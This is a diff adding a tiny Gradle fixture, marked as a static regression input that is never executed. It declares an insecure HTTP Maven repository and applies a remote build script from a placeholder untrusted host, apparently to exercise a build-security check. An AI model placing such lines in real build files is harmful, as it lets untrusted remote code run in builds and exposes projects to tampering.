@@ -1,0 +1,3 @@
+// Static regression input. Never import or execute.
+repositories { maven { url 'http://untrusted.invalid/maven' } }
+apply from: 'https://untrusted.invalid/plugin.gradle'
